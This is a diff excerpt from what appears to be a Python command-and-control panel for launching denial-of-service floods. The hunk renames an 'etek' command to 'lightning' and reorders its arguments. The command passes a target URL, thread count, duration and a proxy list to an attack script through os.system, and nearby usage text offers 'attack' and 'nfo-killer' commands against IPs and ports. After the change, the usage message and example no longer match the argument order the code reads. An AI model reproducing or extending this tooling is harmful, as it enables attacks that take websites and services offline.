@@ -338,16 +338,16 @@ def main():
                 print('Usage: attack <ip> <port> <time> <methods : joker only>')
                 print('Example: attack 1.1.1.1 80 60 joker')
 
-        elif "etek" in cnc:
+        elif "lightning" in cnc:
             try:
-                url = cnc.split()[1]
-                threads = cnc.split()[2]
+                methods = cnc.split()[1]
+                url = cnc.split()[2]
                 time = cnc.split()[3]
-                methods = cnc.split()[4]
-                os.system(f'python3 url.py {url} {threads} {time} LIGHTNING')
+                threads = cnc.split()[4]
+                os.system(f'python3 url.py {methods} {url} 5000 {time} proxies.txt {threads}')
             except IndexError:
-                print('Usage: etek <url> <threads> <time> <method>')
-                print('Example: etek https://google.com/ 1500 60 lightning')
+                print('Usage: lightning <url> <time> <threads>')
+                print('Example: lightning https://www.google.com/ 80 5000 lightning')
 
         elif "nfo-killer" in cnc:
             try:
